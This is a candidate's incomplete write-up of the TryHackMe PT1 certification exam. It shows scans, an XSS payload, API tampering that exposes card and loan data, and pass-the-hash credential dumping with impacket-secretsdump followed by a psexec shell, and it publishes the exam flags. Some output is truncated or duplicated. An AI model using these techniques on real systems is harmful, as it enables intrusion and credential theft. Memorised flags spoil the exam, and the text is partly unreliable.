---
title: "TryHackMe: PT1"
author: c3l1kd
categories: [TryHackMe]
tags: [web application, xss, information disclosure, reconnaissance, nmap, gobuster, burp suite, sql injection, sqlmap, netcat, windows, smb, winrm, evil-winrm, privilege escalation, sebackupprivilege, impacket, bloodhound, kerberos, hashcat, alwaysinstallelevated, linpeas, linux, suid]
render_with_liquid: false
img_path: /images/tryhackme_pt1/
image:
  path: room_image.png
---

> THIS IS NOT DETAIL And Complete WRITE UP BUT YOU FEEL LIKE COMPLETE😊ALSO SOME SCREENSHOTS ARE NOT AVALIBLE BUT YOU CAN UNDERSTAND 
{: .prompt-tip }
## TryHackMe PT1 Certification Overview

**TryHackMe Penetration Tester 1 (PT1)** certification is a practical, hands-on exam designed to validate the skills of aspiring and current Junior Pentesters. It simulates realistic scenarios across three core sections: `Application`, `Network`, and `Active Directory Pentesting`. Candidates are evaluated on their ability to identify, exploit, and report on vulnerabilities, mirroring real-world offensive security engagements. The exam emphasizes fundamental skill sets, including:

- **Reconnaissance & Enumeration:** (`Gathering information using passive and active techniques.`)
- **Web Application Testing:** (`Identifying, exploiting, and reporting common web vulnerabilities.`)
- **Network Penetration Testing:** (`Understanding internal and external network testing techniques.`)
- **Active Directory Exploitation:** (`Performing enumeration and attacks in an Active Directory environment.`)
- **Exploitation & Post-Exploitation:** (`Exploiting vulnerabilities and maintaining access to compromised systems.`)
- **Reporting & Time Management:** (`Documenting findings clearly and managing time effectively within the 48-hour exam duration.`)

> This report serves as a comprehensive documentation of the techniques and findings from the PT1 exam, demonstrating proficiency across these critical domains.
{: .prompt-tip }

## Box 1 (Web Server - API & XSS)
This target primarily involved web application vulnerabilities, specifically Cross-Site Scripting (XSS) and Information Disclosure through API endpoints.

> IP : `10.200.150.100`
{: .prompt-tip }

## Reconnaissance 
```console
$ nmap -sCV -p- -T4 10.200.150.100 -oN 10.200.150.100.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2025-06-07 10:00 EDT
Nmap scan report for 10.200.150.100
Host is up (0.00020s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Werkzeug httpd 3.1.3 (Python 3.12.3)
8080/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.12.3)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.23 seconds
```
> Nothing Found Better In Nmap😁
Let's Make Directory Brute-Forcing Found Find Hidden Dir 
Tool : `gobuster`
```console
$ gobuster dir -u http://10.200.150.100/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,json,xml --status-codes 200,301,302,403
===============================================================
Gobuster v3.5
by OJ (https://github.com/OJ/gobuster)
===============================================================
[+] Url:                     http://10.200.150.100/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:            200,301,302,403
[+] User Agent:              gobuster/3.5
[+] Extensions:              php,html,txt,json,xml
[+] Timeout:                 10s
===============================================================
2025/06/07 10:05:12 Starting gobuster in directory enumeration mode
===============================================================
/loans                (Status: 301)
/api                  (Status: 301)
/index.html           (Status: 200)
/admin                (Status: 403)
... (truncated)
```

we found `http://10.200.150.100/loans/`

> website so top you see `create` button. You will navigate to `http://10.200.150.100/loans/create`.

JUST CREATE IT WITH FAKE DETAILS 

## AS I OBSERVE!
WHEN I CICK ON `CONTINUE` BUTTON IN NETWORK TAB I SEE THE API IS COMING `http://10.200.150.100:8080/api/v1.0/test`

NOTE HERE API IS : `http://10.200.150.100:8080/api/v1.0/`

LETS TEST MORE BUY XSS PAYLOAD LETS SEE INFECTING OR NOT

LETS INPUT HERE AND CONTINUE
![page](01.png){: width="1200" height="600"}
TEST PAYLOAD USED : `<img src=x onerror=(document.cookie='XSS=XSS')>`
I SEE THE POPUP MESSAGE SO IT XSS PAYLOAD
SO IT INJECTED LETS GET THE FLAG NOW

To Get The Flag
```console
$ curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "attacker", "password" : "attacker" }' http://10.200.150.100:8080/api/v1.0/xss
{"flag":"THM{0c8cb256-0c8a-4b59-ac87-1bbb609bef4f}","message":"XSS Success"}
```
Flag-1  Obtained: `THM{0c8cb256-0c8a-4b59-ac87-1bbb609bef4f}`

## 1.2 Information Disclosure
- **Vulnerability Type**: `Information Disclosure via API Endpoints`
To Exploit This Make Sure Brup Is On
![page](02.png){: width="1200" height="600"}
![03](03.png){: width="1200" height="600"}

Now As You Observe In Brup
![brup](04.png){: width="1200" height="600"}
URL Accessed: `http://10.200.150.100:8080/api/v1.0/card`
In This End Pont You Will Observer There Is An Card Details Try To Edit And Send The Req To The Server 
![flag](05.png){: width="1200" height="600"}
```console
http://10.200.150.100:8080/api/v1.0/card
HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.12.3
Date: Sat, 07 Jun 2025 11:02:59 GMT
Content-Type: application/json
Content-Length: 142
Access-Control-Allow-Origin: http://10.200.150.100
Vary: Origin
Connection: close
{"details":{"active":0,"cardNumber":"375914494718066","cvv":"057","expiry":"1/12","flag":"4
cac-bfab-10d5f55ad360}"},"message":"Card updated"}
```
YOU GOT SECOND FLAG 
Flag 2 Obtained: `THM{727723c6-2fe3-4cac-bfab-10d5f55ad360}`

Same Process For Third Flag 

End Point You See : `http://10.200.150.100:8080/api/v1.0/loan?loan_number=e086fc22-85ca-4376-a39a739cdc49c23p`

Now Change The Loan Number You Will Get A Flag
![06](06.png){: width="1200" height="600"}
```console
HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.12.3
Date: Sat, 07 Jun 2025 15:55:33 GMT
Content-Type: application/json
Content-Length: 255
Access-Control-Allow-Origin: http://10.200.150.100
Vary: Origin
Connection: close
{"details":{"amount":50000,"approved":1,"createdAt":"Sat, 07 Jun 2025 15:52:05
GMT","description":"i'm goribs","interest":5,"loan_number":"e086fc22-85ca-4376-a39a739cdc49c22f"},"flag":"THM{9c1a8e66-40b5-41fc-8bde-f821865a5a57}","message":"Loan
updated"}
```
YOU GOT THRID FLAG 
Flag 3 Obtained: `THM{9c1a8e66-40b5-41fc-8bde-f821865a5a57}`

## FINAL FLAG FOR BOX-1
USER UPDATE 
GO TO PROFILE CHANGE THE DETAILD CLICK ON UPDATE 

YOU SEE THE BRUP REQ AND NOW CHANGE THE DETAILS TO ADMIN BUT PROBLEM IS YOU NEED TO GET ADMIN `JWT` FOT TO GET THAT TRY YOU TOOLS LIKE JWT TOKEN EDITE ALSO IN ONLINE SOURCE

YOU GET FINAL FLAG 
![brup](07.png){: width="1200" height="600"}

```console
HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.12.3
Date: Sat, 07 Jun 2025 16:21:35 GMT
Content-Type: application/json
Content-Length: 78
Access-Control-Allow-Origin: http://10.200.150.100
Vary: Origin
Connection: close
THM{ad3bbf7b-a8e4-40de-b839-91ba91329eb5}
{"flag":"THM{ad3bbf7b-a8e4-40de-b839-91ba91329eb5}","message":"User updated"}
```
Final Flag Obtained: `THM{ad3bbf7b-a8e4-40de-b839-91ba91329eb5}`

## Box 2: Active Directory Exploitation (Windows)
> NOTE : THIS IS NOT COMPLETE WRITEUP PLEASE DONT MINE ME I FORGET TO GET THE SNAPSHOTS PLEASE DONT MIND ONECE I GET COMPLTE ANY TIME I WILL COMPLTE IT😒
{: .prompt-tip }

This target involved traditional Windows penetration testing techniques, including SMB enumeration, credential cracking, and privilege escalation via `SeBackupPrivilege`.

## Reconnaissance
```console
$ nmap -sCV -p- -T4 10.200.150.20 -oN 10.200.150.20.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2025-06-07 10:15 EDT
Nmap scan report for 10.200.150.20
Host is up (0.00030s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE      VERSION
445/tcp  open  microsoft-ds Windows 10 Pro 17763 (SMBv3)
3389/tcp open  ms-rdp       Microsoft Terminal Services
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (WinRM)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.45 seconds
```


## GET ROOT FLAG
```console
$ impacket-secretsdump './Administrator@10.200.150.20' -hashes 'aad3b435b51404eeaad3b435b51404ee:a0f3ae0237d82a4c8f0734ffb173ad92'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xfa0661c3eee8696eeb436f2bafa060e7
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a0f3ae0237d82a4c8f0734ffb173ad92:
::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089
c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:95f2822ae7e725c8e30b2b31f
66c1b86:::
[*] Dumping cached domain logon information (domain/username:hash)
TRYHACKME.LOC/Administrator:$DCC2$10240#Administrator#a7e2fe9b84ad21469644db1
10814763a: (2025-04-18 14:42:26)
tryhackme.loc/john:$DCC2$10240#john#5c80a200de9612f2fd848d94c71d4f18: (2025-04-18
21:51:52)
TRYHACKME.LOC/g.knowles:$DCC2$10240#g.knowles#68f04fdbfffb8f8939144ed65514783
d: (2025-04-18 15:42:36)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
TRYHACKME\WRK$:aes256-cts-hmac-sha1-
96:a3462833dd5996c3585a0204105bb02286dbd9b01dced91da664cfb0d1e34937
TRYHACKME\WRK$:aes128-cts-hmac-sha1-96:5835111876430eb6dc4a19d1599c82f8
TRYHACKME\WRK$:des-cbc-md5:6d947a161f3ec701
TRYHACKME\WRK$:plain_password_hex:266ed970670d287e4beaa7931155c10d6db3810a73
68969b6f19a39d27be8f700e3dfdc0b853b6197f5079e393052b155cb0701fe8d26c8eac6357d8d6f
51f5a4939a307553856940eb6f286c8df2281e298c888f1ed5c33042ac5dba419cf432857a6d02f91
fa904d5661d3a7946cd046d4681795d35d8bb352ecd9288ed8460057df0dd50129e921412147646
c868f49efc966d26fef4a2674e080990a28473ee171fdb81e38cc7807153679295ffe0c0bfec709fb2
6e7307e9a066b3d16f6ea1cd3925fd66486a04b6cc7a0580f9b6725d09f83fa5e61991c60553e57ea
9fe07a77f4202a4fac75012a9a4ac49ec6
TRYHACKME\WRK$:aad3b435b51404eeaad3b435b51404ee:78a5ee5e45c83a692d5925acac66
8699:::
[*] DPAPI_SYSTEM
dpapi_machinekey:0x9117806e84e766de5f0e796deb3d789eb9eede6c
dpapi_userkey:0x67e8753ee98e5cc0e9ac98f9373549a0bbee1091
[*] NL$KM
0000 F8 5C 8B ED 35 A3 E4 51 57 3F 89 BD 1C BF 37 CD .\..5..QW?....7.
0010 6D E2 9A DB FE 79 81 78 5A C5 4F CC 27 04 60 89 m....y.xZ.O.'.`.
0020 64 BB F4 89 67 64 4F 3B F1 A4 AB CF 16 0A 5F 89 d...gdO;......_.
0030 8C 7A AC 46 79 1F F1 A7 3E FD 72 61 9F B1 FA AC .z.Fy...>.ra....
NL$KM:f85c8bed35a3e451573f89bd1cbf37cd6de29adbfe7981785ac54fcc2704608964bbf48967
644f3bf1a4abcf160a5f898c7aac46791ff1a73efd72619fb1faac
[*] Cleaning up...
[*] Stopping service RemoteRegistry
impacket-psexec './administrator@10.200.150.20' -hashes
'aad3b435b51404eeaad3b435b51404ee:a0f3ae0237d82a4c8f0734ffb173ad92'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
[*] Requesting shares on 10.200.150.20.....
[*] Found writable share ADMIN$
[*] Uploading file AbhAxFRT.exe
[*] Opening SVCManager on 10.200.150.20.....
[*] Creating service roqC on 10.200.150.20.....
[*] Starting service roqC.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.
```

```console
$ impacket-psexec './administrator@10.200.150.20' -hashes 'aad3b435b51404eeaad3b435b51404ee:a0f3ae0237d82a4c8f0734ffb173ad92'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
[*] Requesting shares on 10.200.150.20.....
[*] Found writable share ADMIN$
[*] Uploading file AbhAxFRT.exe
[*] Opening SVCManager on 10.200.150.20.....
[*] Creating service roqC on 10.200.150.20.....
[*] Starting service roqC.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.
C:\Windows\system32> cd C:\User
The system cannot find the path specified.
C:\Windows\system32> cd C:\Users\Administrator\Desktop
C:\Users\Administrator\Desktop> type flag.txt
THM{58b41573-062b-42ea-b312-dd5b7cc27671}
C:\Users\Administrator\Desktop>
```
![brup](08.png){: width="1200" height="600"}
Found Flag 1 : `THM{58b41573-062b-42ea-b312-dd5b7cc27671}`


### THERE IS NO COMPLETE WRITEUPS I WILL ATTEND AGAIN AND COMPLTE THIS 😒